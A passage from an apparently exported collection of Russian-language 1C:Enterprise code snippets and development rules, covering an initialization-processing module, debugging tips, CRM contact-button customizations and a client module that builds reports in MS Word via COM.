        Обработки.АБ_ОбработкаИнициализации.Создать().ВыполнитьОбработку();
    КонецЕсли;

КонецПроцедуры
Код модуля обработки инициализации

//////////////////////////////////////////////////////////

// ОБРАБОТКА ИНИЦИАЛИЗАЦИИ
// --------------------------
// Обработку предполагается запускать многократно.
// Каждое действие должно корректно отрабатывать как при первом запуске обработки, так и при повторных запусках.
// Во втором случае не должно быть каких-либо побочных эффектов или потери введённых пользователем данных.
// В некоторых случаях (если того требует задача) возможно выявление и исправление настроек, уже сделанных,
// но некорректно изменённых пользователем с момента предыдущей инициализации.
// --------------------------
// Используемые объекты конфигурации:
//  1. Константа.ВерсияВыполненнойОбработкиИнициализации - Тип: Число (5,0)
//  2. Вызов обработки при старте системы: Обработки.ОбработкаИнициализации.Создать().ВыполнитьОбработку();
// --------------------------
// Алгоритм для разработчика:
//   1. В процедуре ПолучитьТекущуюВерсиюОбработки() увеличиваете весрию на 1, напрмер было 3, вы ставите 4.
//   2. В модуль обработки добавляете процедуру ОбработкаИнициализации_Весия_4(Отказ).
//   3. Если в процессе обработки возникли ошибки, необходимо установить переменную Отказ в значение Истина.
//   4. Необходимый код располагаете в данной процедуре.

//********************************************************
Функция ПолучитьТекущуюВерсиюОбработки() Экспорт

    // ВНИМАНИЕ!
    // Код не комментируем, просто увеличиваем текущую версию обработки
    // Тип версии - Число (5,0)
    Возврат 3;

КонецФункции

//********************************************************
Функция ПолучитьПрошлуюВерсиюОбработки() Экспорт

    Возврат Константы.АБ_ВерсияВыполненнойОбработкиИнициализации.Получить();

КонецФункции

//********************************************************
Функция УстановитьВерсиюОбработки(ТекущаяВерсия) Экспорт

    //Запишем текущую версию в константу
    Попытка
        Константы.АБ_ВерсияВыполненнойОбработкиИнициализации.Установить(ТекущаяВерсия);
        Возврат Истина;
    Исключение
        Сообщить(""Обработка инициализации: "" + ОписаниеОшибки());
        Возврат Ложь;
    КонецПопытки;

КонецФункции

//********************************************************
Функция ВыполнитьОбработку(ВсеОбработчики = Ложь) Экспорт

    //Обработку инициализации может выполнить только пользователь с полными правами
    Если Не РольДоступна(""ПолныеПрава"") Тогда
        Сообщить(""Обработка инициализации: Недостаточно прав для выполнения обработки!"");
        Возврат Ложь;
    КонецЕсли;

    Если ВсеОбработчики Тогда
        ПрошлаяВерсия = 0;
    Иначе
        ПрошлаяВерсия = ПолучитьПрошлуюВерсиюОбработки();
    КонецЕсли;
    ТекущаяВерсия = ПолучитьТекущуюВерсиюОбработки();

    //Обработка не нужна
    Если ТекущаяВерсия <= ПрошлаяВерсия Тогда
        Возврат Истина;
    КонецЕсли;

    //В цикле выполняем все необходимые обработки
    Отказ = Ложь;
    Для Сч = ПрошлаяВерсия+1 По ТекущаяВерсия Цикл
        Выполнить(""ОбработкаИнициализации_Весия_""+Сч+""(Отказ);"");
    КонецЦикла;

    Если Отказ Тогда
        Сообщить(""Обработка инициализации: Ошибка выполнения обоработки!"");
        Возврат Ложь;
    КонецЕсли;

    //Запишем текущую версию в константу
    Если УстановитьВерсиюОбработки(ТекущаяВерсия) Тогда
        Сообщить(""Обработка инициализации: Переход на версию "" + ТекущаяВерсия + "" выполнен успешно!"");
        Возврат Истина;
    Иначе
        Возврат Ложь;
    КонецЕсли;

КонецФункции

//********************************************************
Процедура ОбработкаИнициализации_Весия_1(Отказ)

    //Действия обработчика
    Сообщить(""Обработка инициализации, выполнен переход на версию 1"");

КонецПроцедуры
Форма обработки:

pravila-razrabotki-tipovyx-konfiguracij-chast2__006

Скачать обработку можно, например, здесь.

4. Справочник предопределённых значений
При доработке конфигураций часто возникает необходимость обращаться из кода с существующим элементам справочников, не являющихся предопределёнными. Т. к. поиск по коду, наименованию или реквизиту не является надёжным решением, можно добавить в конфигурацию справочник «Предопределённые значения» с единственным реквизитом «Значение» типа «СправочникСсылка».

pravila-razrabotki-tipovyx-konfiguracij-chast2__009

Далее по каждой возникшей задаче в этот справочник добавляется предопределенный элемент.

pravila-razrabotki-tipovyx-konfiguracij-chast2__011

Реквизит «Значение» данного элемента заполняется обработкой инициализации или вручную.

pravila-razrabotki-tipovyx-konfiguracij-chast2__010

Обращение к такому значению осуществляется подобным кодом:

КонтрагентАгроимпульс = Справочники.АБ_ПредопределенныеЗначения.Контрагент_Агроимпульс.Значение;
Права на справочник предопределенных значений должны обеспечивать как доступность его содержимого, так и возможность настройки значений только пользователями с нужными ролями.

5. Просмотр временных таблиц в отладчике
При отладке сложных запросов с временными таблицами нужна возможность просматривать содержимое этих таблиц, которую отладчик не предоставляет.

Для просмотра временных таблиц запроса в отладчике удобно использовать специальную функцию. Данная функция парсит текст запроса, вычленяет все временные таблицы, вычисляет их и результат складывает в структуру.

Для удобства использования удобно поместить процедуру в один из глобальных модулей конфигурации.

funkciya-prosmotra-vremennyx-tablic-zaprosa-v-otladchike_03

funkciya-prosmotra-vremennyx-tablic-zaprosa-v-otladchike_04

Функция предназначена для использования в окне «Вычислить выражение» отладчика — возвращает значение, удобное для просмотра в этом окне. Функция максимально автоматизирована и может работать с входными данными разных типов. Назначение аргументов функции понятно из их имён.

funkciya-prosmotra-vremennyx-tablic-zaprosa-v-otladchike_01

Текст процедур можно посмотреть — здесь.

6. Версии внешних отчётов и обработок
При использовании внешних отчетов и обработок в поле «Комментарий» следует указывать строку, отображающую условную версию объекта. Например, начиная с «v1.0» и далее увеличивая старший или младший номер (в зависимости от объёма изменений) при каждом цикле доработки объекта.

pravila-razrabotki-tipovyx-konfiguracij-chast2__012

Данный комментарий доступен из кода, и при открытии формы его следует добавлять к заголовку окна:

#Область СобытияФормы

////////////////////////////////////////////////////////////
// ОБРАБОТЧИКИ СОБЫТИЙ ФОРМЫ

//**********************************************************
&НаСервере
Процедура ПриСозданииНаСервере(Отказ, СтандартнаяОбработка)

    //Заголовок формы
    ЭтаФорма.АвтоЗаголовок = Ложь;
    ЭтаФорма.Заголовок = ЗаголовокОтчета();

КонецПроцедуры

//**********************************************************
&НаСервере
Функция ЗаголовокОтчета()

    ТекОбъект = РеквизитФормыВЗначение(""Объект"");
    Комментарий = ТекОбъект.Метаданные().Комментарий;
    Возврат ТекОбъект.Метаданные().Синоним
        + ?(ЗначениеЗаполнено(Комментарий),"" ("" + Комментарий + "")"","""");

КонецФункции

#КонецОбласти
Тогда версия обработки или отчета всегда будет видна в заголовке формы."}
},
{0,
{"Отладка (попасть в отладку)",0,0,"","Только самые простые задачи не требуют отладки. Для решения сложных задач без отладки в принципе не обойтись. С годами придумал способ упростить этот процесс.
1) Включаем отладку (без точек останова), включаем замер производительности, выполняем отлаживаемые действия, выключаем замер производительности (появится список выполненных команд и он будет подсвечен в коде).
2) Потом устанавливаем точки останова и идем по шагам, т.е. выполняем обычную отладку.
Теперь мы заранее видим какой код будет исполнен (и сколько раз). Это значительно ускоряет процесс отладки сложного, объемного кода."}
},
{2,
{"АвтоТест",1,0,"",""},
{0,
{"АвтоТест",0,0,"АвтоТест","Если Параметры.Свойство(""АвтоТест"") Тогда 
	// Возврат при получении формы для анализа.
	Возврат;
КонецЕсли;"}
},
{0,
{"Получить форму с параметром АвтоТест",0,0,"","лАвтоТест 	= Новый Структура(""АвтоТест"", Истина);
лФорма 		= ПолучитьФорму("""", лАвтоТест);"}
}
},
{2,
{"Доработки Типовых Конфигураций",1,0,"",""},
{1,
{"УНФ + CRM (1.6.17/3.0.15) (1.6.17.175)",1,0,"",""},
{0,
{"Кнопки звонков (программно)",0,0,"","&Вместо(""ЕстьДублиПартнеров"")
Функция АйТи_ЕстьДублиПартнеров(Знач Партнер, Знач СтруктураПоиска, Знач СписокКонтактов, Знач ТочноеСоответствие)
	
	Выборка = CRM_КлиентыСервер.НайтиДубли(Партнер, СтруктураПоиска, СписокКонтактов, Ложь);
	Если Выборка <> Неопределено И Выборка.Количество()>0 Тогда
		Возврат Истина;
	Иначе
		Возврат Ложь;
	КонецЕсли;
	
КонецФункции

&НаСервере
Процедура ОбновитьЭлементыКонтактов()
	
	//Вывести кнопки правее КИ, чтобы звонить, писать и т.д.
	КонтактнаяИнформация 	= ЭтаФорма[""КонтактнаяИнформация""]; //""КонтактнаяИнформация"" создаётся программно в КонтактнаяИнформацияУНФ.ПриСозданииПриЧтенииНаСервере(ЭтотОбъект)
	ИндексКонтакта 			= ""Компания"";
	Для Каждого ДанныеКИ Из КонтактнаяИнформация Цикл
		
		Если ДанныеКИ.Тип = Перечисления.ТипыКонтактнойИнформации.ВебСтраница Тогда
			Продолжить; // Т.к. веб-страницу выводит типовым в ""Подключаемый_ДействиеКИНажатие""
		КонецЕсли; 
		
		ИндексКИ = КонтактнаяИнформация.Индекс(ДанныеКИ);
		ГруппаЗначениеКИ = Элементы[""КИ_"" + ИндексКИ];
		Если ДанныеКИ.Тип = Перечисления.ТипыКонтактнойИнформации.Телефон Тогда
			ДекорацияДействие = Элементы.Добавить(""ДействиеКомпанияКонтакт_"" + ИндексКонтакта + ""_КИ_"" + ИндексКИ + ""_1"", Тип(""ДекорацияФормы""), ГруппаЗначениеКИ);
			ДекорацияДействие.Вид = ВидДекорацииФормы.Картинка;
			ДекорацияДействие.Картинка = БиблиотекаКартинок.CRM_SMSСообщение;
			ДекорацияДействие.Гиперссылка = Истина;
			ДекорацияДействие.Ширина = 2;
			ДекорацияДействие.Высота = 1;
			ДекорацияДействие.УстановитьДействие(""Нажатие"", ""Подключаемый_ОтправитьСМСНаНомерКомпания"");
			ДекорацияДействие.Подсказка = ""Отправить SMS сообщение на данный номер телефона"";
		КонецЕсли;
		
		ДекорацияДействие = Элементы.Добавить(""ДействиеКомпанияКонтакт_"" + ИндексКонтакта + ""_КИ_"" + ИндексКИ + ""_2"", Тип(""ДекорацияФормы""), ГруппаЗначениеКИ);
		ДекорацияДействие.Вид = ВидДекорацииФормы.Картинка;
		ДекорацияДействие.Картинка = КонтактнаяИнформацияУНФ.КартинкаДействияПоТипуКонтактнойИнформации(ДанныеКИ.Тип);
		ДекорацияДействие.Гиперссылка = Истина;
		ДекорацияДействие.Ширина = 2;
		ДекорацияДействие.Высота = 1;
		Если ДанныеКИ.Тип = Перечисления.ТипыКонтактнойИнформации.Телефон Тогда
			ДекорацияДействие.УстановитьДействие(""Нажатие"", ""Подключаемый_ПозвонитьНаНомерКомпания"");
			ДекорацияДействие.Подсказка = ""Позвонить на данный номер телефона"";
		ИначеЕсли ДанныеКИ.Тип = Перечисления.ТипыКонтактнойИнформации.АдресЭлектроннойПочты Тогда
			ДекорацияДействие.УстановитьДействие(""Нажатие"", ""Подключаемый_ОтправитьEmailКомпания"");
			ДекорацияДействие.Подсказка = ""Отправить Email по данному адресу"";
		Иначе
			ДекорацияДействие.УстановитьДействие(""Нажатие"", ""Подключаемый_ДействиеКИКомпанияНажатие"");
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

&НаСервере
Процедура АйТи_ПриСозданииНаСервереПосле(Отказ, СтандартнаяОбработка)
	
	ОбновитьЭлементыКонтактов();
	
КонецПроцедуры

//+++ АйТи КучеровРМ 13.08.2019
Функция ПолучитьИндексКИКомпании(пЭлементИмя)
	
	лРезультат 	= Неопределено;
	
	лСтрокаБаза = ""ДействиеКомпанияКонтакт_Компания_КИ_"";
	Если СтрНайти(пЭлементИмя, лСтрокаБаза) > 0 Тогда
		лИндексы 	= Сред(пЭлементИмя, СтрДлина(лСтрокаБаза) + 1, СтрДлина(пЭлементИмя));
		лРезультат 	= СтрРазделить(лИндексы, ""_"", Ложь);
	КонецЕсли;
	
	Возврат лРезультат;
	
КонецФункции // ПолучитьИндексКИКомпании() //--- АйТи КучеровРМ 13.08.2019
 
&НаКлиенте
Процедура Подключаемый_ДействиеКИКомпанияНажатие(Элемент)
	
	лИндекс 	= ПолучитьИндексКИКомпании(Элемент.Имя);
	Если лИндекс = Неопределено ИЛИ НЕ ЗначениеЗаполнено(лИндекс) Тогда
		Возврат; 
	КонецЕсли; 
	
	СтрокаКИ 	= ЭтаФорма.КонтактнаяИнформация[Число(лИндекс[0])];
	
	ДанныеКИ 	= Новый Структура;
	ДанныеКИ.Вставить(""Тип""				, СтрокаКИ.Тип);
	ДанныеКИ.Вставить(""Представление""	, СтрокаКИ.Представление);
	ДанныеКИ.Вставить(""Владелец""		, Объект.Ссылка);
	
	КонтактнаяИнформацияУНФКлиент.ОбработатьНажатиеПиктограммы(ЭтотОбъект, Элемент, ДанныеКИ);
	
КонецПроцедуры

&НаКлиенте
Процедура Подключаемый_КонтактнаяИнформацияОсновнойДляСвязиКомпания(Элемент)
	// +CRM_УНФ временно блокируем
	Возврат;	
	// -CRM_УНФ
	ПозицияПодчеркиванияОдин = СтрНайти(Элемент.Имя, ""_"",,,1);
	ПозицияПодчеркиванияДва  = СтрНайти(Элемент.Имя, ""_"",,,2);
	ПозицияПодчеркиванияТри  = СтрНайти(Элемент.Имя, ""_"",,,3);
	
	ИндексКЛ = Число(Сред(Элемент.Имя, ПозицияПодчеркиванияОдин+1, ПозицияПодчеркиванияДва-ПозицияПодчеркиванияОдин-1));
	ИндексКИ = Число(Сред(Элемент.Имя, ПозицияПодчеркиванияТри+1));
	ДанныеКонтактныхЛиц[ИндексКЛ].Изменен = Истина;
	ДанныеКИ = ДанныеКонтактныхЛиц[ИндексКЛ].КонтактнаяИнформация[ИндексКИ];
	
	ДанныеКИ.CRM_ОсновнойДляСвязи = (НЕ ДанныеКИ.CRM_ОсновнойДляСвязи);
	
	Модифицированность = Истина;
	
	Элемент.Картинка = ?(ДанныеКИ.CRM_ОсновнойДляСвязи, БиблиотекаКартинок.CRM_КонтактнаяИнформацияОсновная, БиблиотекаКартинок.CRM_КонтактнаяИнформацияВторичная);
	Элементы[""ПредставлениеКонтакт_"" + ИндексКЛ + ""_КИ_"" + ИндексКИ].Шрифт	= ОбщегоНазначенияВызовСервера.ШрифтСтиля(?(ДанныеКИ.CRM_ОсновнойДляСвязи,""ШрифтПравойПанелиОтборов"",""ОбычныйШрифтТекста""));
	
	МассивКИДанногоТипа = ДанныеКонтактныхЛиц[ИндексКЛ].КонтактнаяИнформация.НайтиСтроки(Новый Структура(""Тип"", ДанныеКИ.Тип));
	
	Для Каждого ДанныеКИ ИЗ МассивКИДанногоТипа Цикл
		
		СтрокаИндексКИ = ДанныеКонтактныхЛиц[ИндексКЛ].КонтактнаяИнформация.Индекс(ДанныеКИ);
		Если СтрокаИндексКИ = ИндексКИ Тогда Продолжить; КонецЕсли;
		
		ДанныеКИ.CRM_ОсновнойДляСвязи = Ложь;
		
		Элементы[""ОсновнойДляСвязиКонтакт_"" + ИндексКЛ + ""_КИ_"" + СтрокаИндексКИ].Картинка = БиблиотекаКартинок.CRM_КонтактнаяИнформацияВторичная;
		Элементы[""ПредставлениеКонтакт_"" + ИндексКЛ + ""_КИ_"" + СтрокаИндексКИ].Шрифт	= ОбщегоНазначенияВызовСервера.ШрифтСтиля(""ОбычныйШрифтТекста"");
	КонецЦИкла;
	
	
КонецПроцедуры // Подключаемый_КонтактнаяИнформацияОсновнойДляСвязиКонтакт()

&НаКлиенте
Процедура Подключаемый_ОтправитьСМСНаНомерКомпания(Элемент)
	
	лИндекс 	= ПолучитьИндексКИКомпании(Элемент.Имя);
	Если лИндекс = Неопределено ИЛИ НЕ ЗначениеЗаполнено(лИндекс) Тогда
		Возврат; 
	КонецЕсли; 
	
	СтрокаКИ 	= ЭтаФорма.КонтактнаяИнформация[Число(лИндекс[0])];
	
	ДанныеКИ 	= Новый Структура;
	ДанныеКИ.Вставить(""Тип""				, СтрокаКИ.Тип);
	ДанныеКИ.Вставить(""Представление""	, СтрокаКИ.Представление);
	ДанныеКИ.Вставить(""Владелец""		, Объект.Ссылка);
	
	Если НЕ ЗначениеЗаполнено(Объект.Ссылка) Тогда
		ТекстСообщения = НСтр(""ru = 'Необходимо записать элемент'"");
		Сообщить(ТекстСообщения, СтатусСообщения.Внимание);
	ИначеЕсли CRM_ОбщегоНазначенияКлиент.смсПроверитьДоступностьSMS4B() Тогда
		Телефон = ДанныеКИ.Представление;
		Если ПустаяСтрока(Телефон) Тогда Возврат; КонецЕсли;
		Структура = Новый Структура();
		Структура.Вставить(""Ссылка"", Объект.Ссылка);
		Структура.Вставить(""Телефон"", SMS4B_ОтправкаSMS.ФорматироватьНомер(Телефон));
		ПараметрыФормы = Новый Структура();
		ПараметрыФормы.Вставить(""Основание"", Структура);
		ОткрытьФорму(""Документ.СообщениеSMS.ФормаОбъекта"", ПараметрыФормы);
	КонецЕсли;
	
КонецПроцедуры

&НаКлиенте
Процедура Подключаемый_ПозвонитьНаНомерКомпания(Элемент)
	
	лИндекс 	= ПолучитьИндексКИКомпании(Элемент.Имя);
	Если лИндекс = Неопределено ИЛИ НЕ ЗначениеЗаполнено(лИндекс) Тогда
		Возврат; 
	КонецЕсли; 
	
	СтрокаКИ 	= ЭтаФорма.КонтактнаяИнформация[Число(лИндекс[0])];
	
	ДанныеКИ 	= Новый Структура;
	ДанныеКИ.Вставить(""Тип""				, СтрокаКИ.Тип);
	ДанныеКИ.Вставить(""Представление""	, СтрокаКИ.Представление);
	ДанныеКИ.Вставить(""Владелец""		, Объект.Ссылка);
	
	Если НЕ ЗначениеЗаполнено(Объект.Ссылка) Тогда
		ТекстСообщения = НСтр(""ru = 'Необходимо записать элемент'"");
		Сообщить(ТекстСообщения, СтатусСообщения.Внимание);
		Возврат;
	КонецЕсли;
//+СофтФон
	Если НЕ сфпСофтФонПроКлиент.сфпПроверитьДоступностьСофтФон(Истина) Тогда Возврат; КонецЕсли;
	
	Телефон = ДанныеКИ.Представление;
	
	Если ПустаяСтрока(Телефон) Тогда
		ПоказатьПредупреждение(, НСтр(""ru = 'Не выбран номер телефона!'""), 5);
		Возврат;
	КонецЕсли;	
	
	сфпСофтФонПроКлиент.сфпПозвонить(Телефон, Объект.Ссылка);
//-СофтФон
	
КонецПроцедуры

&НаКлиенте
Процедура Подключаемый_ОтправитьEmailКомпания(Элемент)
	
	лИндекс 	= ПолучитьИндексКИКомпании(Элемент.Имя);
	Если лИндекс = Неопределено ИЛИ НЕ ЗначениеЗаполнено(лИндекс) Тогда
		Возврат; 
	КонецЕсли; 
	
	СтрокаКИ 	= ЭтаФорма.КонтактнаяИнформация[Число(лИндекс[0])];
	
	ДанныеКИ 	= Новый Структура;
	ДанныеКИ.Вставить(""Тип""				, СтрокаКИ.Тип);
	ДанныеКИ.Вставить(""Представление""	, СтрокаКИ.Представление);
	ДанныеКИ.Вставить(""Владелец""		, Объект.Ссылка);
	
	Если НЕ ЗначениеЗаполнено(Объект.Ссылка) Тогда
		ТекстСообщения = НСтр(""ru = 'Необходимо записать элемент'"");
		Сообщить(ТекстСообщения, СтатусСообщения.Внимание);
		Возврат;
	КонецЕсли;
	
	АдресЭлектроннойПочты = ДанныеКИ.Представление;
	СтрРезультат = CRM_ОбщегоНазначенияКлиентСервер.АнализАдресаЭП(АдресЭлектроннойПочты);
	Если СтрРезультат.КодОшибки<>0 Тогда
		ОбщегоНазначенияКлиентСервер.СообщитьПользователю(СтрРезультат.Сообщение);
		Возврат;
	КонецЕсли;
	
	СписокАдресов = Новый СписокЗначений;
	
	СписокАдресов.Добавить(Объект.Ссылка, СтрРезультат.АдресЭП);
	
	ПараметрыФормы = Новый Структура();
	ПараметрыФормы.Вставить(""СписокАдресов"", СписокАдресов);
			
	ОткрытьФорму(""Документ.ЭлектронноеПисьмоИсходящее.ФормаОбъекта"", ПараметрыФормы);
			
КонецПроцедуры
"}
}
},
{3,
{"ГМЗ",1,0,"",""},
{0,
{"ПостроительОтчетовКлиент (ПолучитьДанныеШаблонаИзФайла)",0,0,"","// МОДУЛЬ ПОСТРОИТЕЛЬ ОТЧЕТОВ КЛИЕНТ
// Клиентская часть построителя отчетов.
// В модуле осуществляется сохранение сформированного текста отчета в файл, 
// и открытие его в MSWord. Так же осуществляется переформирование оглавление файла 
// и обработка тэгов из файла, если константа ОбработкаФрагментовНаСервере не включена

#Область ПроцедурыИФункцииРаботыСФайлами

// Проверка является ли текущая платформа Windows
//
// Возвращаемое значение
//  Истина - операционная система Windows
//
Функция ЭтоWindows()
	СистемнаяИнформация = Новый СистемнаяИнформация;
	Возврат СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86 Или
		 	СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64;
КонецФункции

// Формирование имени файла на основании имени отчета
//
// Параметры
//  ИмяОтчета - in, путь к шаблону отчета или шаблон в конфигураторе
//  Расширение - in, объект, вызвавший формирование отчета
//
// Возвращаемое значение
//  Имя файла отчета
//
Функция СформироватьИмяФайлаОтчета(Знач ИмяОтчета, Знач Расширение = ""docx"")
	Возврат ?(ЗначениеЗаполнено(ИмяОтчета), ИмяОтчета + ""_"", """") + СтрЗаменить(ТекущаяДата(), "":"", ""_"") + ""."" + Расширение;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииРаботыСMSWordЧерезCOM

// Переформирование оглавления в MS Word
//
// Параметры
//  MSWord - in, COM-объект MS Word Document
//
Процедура ПереформироватьОглавление(MSWord)
	цКолОглавлений = MSWord.Application.ActiveDocument.TablesOfContents.Count;
	Для цШаг = 1 По цКолОглавлений Цикл
		MSWord.Application.ActiveDocument.TablesOfContents(цШаг).Update();
	КонецЦикла;
КонецПроцедуры

// Копирование в буфер обмена соедржимого MS Word документа
//
// Параметры
//  Путь - in, путь к документу MS Word
//
// Возвращаемое значение
//  Истина, если при копировании не возникло ошибок, иначе - ложь
//
Функция СкопироватьФрагментВБуферОбмена(Путь)
	Если ЗначениеЗаполнено(Путь) Тогда
   		Попытка
			MSWord = ПолучитьCOMОбъект(Путь, ""Word.Document"");
			MSWord.Activate();
			//выделяем все содержимое		
			MSWord.Application.ActiveDocument.Select();
			//копируем выделенное содержимое в буфер обмена
			MSWord.Application.Selection.Copy();
			//закрываем открытый документ
			MSWord.Close();
			
			Возврат Истина;
		Исключение
			Сообщить(""Содержимое временного файла """""" + Путь + """""" не было вставлено из-за проблем с его содержимым! Возможно его формат отличен от doc или docx!"");
		КонецПопытки;
	КонецЕсли;
	
	Возврат Ложь;
КонецФункции

// Обработка секций из файла
//
// Параметры
//  MSWord - in, COM-объект MS Word Document
//  АдресаФрагментов - in, соответствие адресов фрагментов в хранилище на сервере и в файловой системе на клиенте
//
Процедура ОбработатьСекцииИзФайла(MSWord, АдресаФрагментов)
	Содержимое = MSWord.Application.ActiveDocument.Content;
	// ищем и выделяем начало секции
	РезультатПоиска = Содержимое.Find.Execute(""[ec0d9727-b7c1-4232-8bce-abc762da22ac]"");
	Пока РезультатПоиска Цикл
		// сохраняем позицию начала и удаляем начало секции
		Начало = Содержимое.Start;
		Содержимое.Text = """";
		Содержимое.Start = 0;
		Содержимое.End = 0;
		// ищем и выделяем конец секции
		РезультатПоиска = Содержимое.Find.Execute(""[/ec0d9727-b7c1-4232-8bce-abc762da22ac]"");
		Если Не РезультатПоиска Тогда
			// если нашли начало, но не нашли конец, 
			// то сразу прерываем выполнение, т.к. такого быть не может
			Сообщить(""В печатной форме нарушена структура фрагментов!"");
			Возврат;
		КонецЕсли;
		// сохраняем позицию конца и удаляем конец секции
		Конец = Содержимое.Start;
		Содержимое.Text = """";
		// выделяем адрес файла во временном хранилище
		Содержимое.Start = Начало;
		Содержимое.End = Конец;
		АдресДанныхФайла = Содержимое.Text;
		бЕстьАбзац = (Найти(АдресДанныхФайла, ""[w:p]"") > 0);
		Если бЕстьАбзац Тогда
			АдресДанныхФайла = Сред(АдресДанныхФайла, 6);
			Содержимое.End = Содержимое.End - СтрДлина(АдресДанныхФайла);
		КонецЕсли;
		// копируем содержимое файла в буфер обмена MS Word и вставляем вместо адреса
		Если СкопироватьФрагментВБуферОбмена(АдресаФрагментов.Получить(АдресДанныхФайла)) Тогда
			Содержимое.PasteAndFormat(16);
			Если бЕстьАбзац Тогда
				Содержимое.Start = 0;
				Содержимое.End = 0;
				Содержимое.Find.Execute(АдресДанныхФайла);
				Содержимое.End = Содержимое.End + 1;
				Содержимое.Delete();
			КонецЕсли;
		КонецЕсли;
		// ищем и выделяем начало секции
		РезультатПоиска = Содержимое.Find.Execute(""[ec0d9727-b7c1-4232-8bce-abc762da22ac]"");
	КонецЦикла;
	Содержимое.Start = 0;
	Содержимое.End = 0;
	MSWord.Activate();
КонецПроцедуры

// Обрабатывает отчет с помощью MS Word (имеет смысл только в клиенте 1С или веб-клиент 
// IE с включенной возможностью создавать com-объекты)
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы
//
// Возвращаемое значение 
//  COM-объект MS Word Document или Неопределено
//
Функция ОбработатьОтчетВMSWord(ДанныеОтчета) Экспорт
	MSWord = Неопределено;
	ПутьКИтоговомуФайлу = """";
	// работаем с Вордом через ком
	Если ДанныеОтчета.Свойство(""ПутьКИтоговомуФайлу"", ПутьКИтоговомуФайлу) Тогда
		Попытка
			MSWord = ПолучитьCOMОбъект(ПутьКИтоговомуФайлу, ""Word.Document"");
			Попытка
				MSWord.Activate();
				Если Не ДанныеОтчета.ОбработкаФрагментовНаСервере И ДанныеОтчета.АдресаФрагментов.Количество() > 0 Тогда 
					ОбработатьСекцииИзФайла(MSWord, ДанныеОтчета.АдресаФрагментов);
				КонецЕсли;
				ПереформироватьОглавление(MSWord);
				MSWord.Save();
			Исключение
				MSWord.Close();
				Сообщить(КраткоеПредставлениеОшибки(ИнформацияОбОшибке()));
			КонецПопытки;
		Исключение
			// если Ворда нет или веб-клиент не IE с включенной возможностью создавать com-объекты, 
			// то значит он не установлен, глушим исключение
			Сообщить(КраткоеПредставлениеОшибки(ИнформацияОбОшибке()));
			MSWord = Неопределено;
		КонецПопытки;
	КонецЕсли;
	
	Возврат MSWord;
КонецФункции

#КонецОбласти

#Область ПроцедурыФормированияФайлаПечатнойФормы

// Сохранение отчета в файловую систему клиента
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы, должны быть получены в результате формирования печатной формы на сервере 
//		(ПостроительОтчетовСервер.СформироватьОтчет). Может содержать следующие дополнительные параметры, влияющие на процесс 
//		формирование печатной формы (параметры не имеют значения в веб-клиенте, при неустановленном расширении работы с файлами, 
//		в этом случае сохранение выполняется средствами браузера в соответствии с его настройками):
//			ПутьДляСохранения - путь к файлу или каталогу, по которому необходимо сохранить печатную форму
//			Интерактивно - интерактивный режим, в котором пользователю показывается диалог сохранения
//  ОбработчикРезультата - in, содержит описание процедуры, которая будет вызвана после сохранения файла печатной формы 
//		со следующими параметрами (не имеет значения в веб-клиенте, при неустановленном расширении работы с файлами): 
//			Результат – результат сохранения файла, Истина - файл успешно сохранен
//			ДанныеОтчета - данные формировния печатной формы
//
Процедура СохранитьОтчет(ДанныеОтчета, ОбработчикРезультата = Неопределено) Экспорт
	Если Не ДанныеОтчета.Свойство(""ИмяОтчета"") Тогда
		ДанныеОтчета.Вставить(""ИмяОтчета"", """");
	КонецЕсли;
	
	ДанныеОтчета.Вставить(""ОбработчикРезультата"", ОбработчикРезультата);
	НачатьПодключениеРасширенияРаботыСФайлами(Новый ОписаниеОповещения(""СохранитьОтчетПослеПодключенияРасширения"", ПостроительОтчетовКлиент, ДанныеОтчета));
КонецПроцедуры

// Сохранение отчета в файловую систему клиента - продолжение
//
// Параметры
//  РасширениеПодключено - in, результат подключения расширения работы с файлами
//  ДанныеОтчета - in, данные формировния печатной формы
Процедура СохранитьОтчетПослеПодключенияРасширения(РасширениеПодключено, ДанныеОтчета) Экспорт
	ДанныеОтчета.Вставить(""РасширениеПодключено"", РасширениеПодключено);
	// если расширение подключено, то используем его
	Если РасширениеПодключено Тогда
		СохранитьОтчетСИспользованиемРасширения(ДанныеОтчета);
	Иначе
		СохранитьОтчетБезИспользованияРасширения(ДанныеОтчета);
	КонецЕсли;
КонецПроцедуры

// Сохранение отчета в файловую систему клиента с использованием расширеня работы с файлами
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы
Процедура СохранитьОтчетСИспользованиемРасширения(ДанныеОтчета)
	ДанныеОтчета.Вставить(""ИмяФайла"");
	// определяем место для временного файла
	ПутьДляСохранения = """";
	Если ДанныеОтчета.Свойство(""ПутьДляСохранения"", ПутьДляСохранения) И ЗначениеЗаполнено(ПутьДляСохранения) Тогда
		// если путь задан, то получаем каталог и имя файла
		КаталогФайла = """";
		ПостроительОтчетовКлиентСервер.ПолучитьКаталогИИмяФайла(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьДляСохранения), КаталогФайла, ДанныеОтчета.ИмяФайла);
		СохранитьОтчетСИспользованиемРасширенияПродолжение(КаталогФайла, ДанныеОтчета);
	Иначе
		// если путь не задан и не веб-клиент, то берем временную папку и формируем имя файла
		НачатьПолучениеКаталогаВременныхФайлов(Новый ОписаниеОповещения(""СохранитьОтчетСИспользованиемРасширенияПродолжение"", ПостроительОтчетовКлиент, ДанныеОтчета));
	КонецЕсли;
КонецПроцедуры

// Сохранение отчета в файловую систему клиента с использованием расширеня работы с файлами - продолжение
//
// Параметры
//  КаталогФайла - in, каталог временных файлов
//  ДанныеОтчета - in, данные формировния печатной формы
Процедура СохранитьОтчетСИспользованиемРасширенияПродолжение(КаталогФайла, ДанныеОтчета) Экспорт
	// если имя файла еще не заполнено, то формируем его
	ИмяФайла = ДанныеОтчета.ИмяФайла;
	Если ПустаяСтрока(ИмяФайла) Тогда
		ИмяФайла = СформироватьИмяФайлаОтчета(ДанныеОтчета.ИмяОтчета, ""docx"");
	КонецЕсли;
	
	// если требуется, то создаем диалог сохранения
	Интерактивно = ДанныеОтчета.Свойство(""Интерактивно"") И ДанныеОтчета.Интерактивно;
	Если Интерактивно Тогда
		ДиалогСохранения = Новый ДиалогВыбораФайла(РежимДиалогаВыбораФайла.Сохранение);
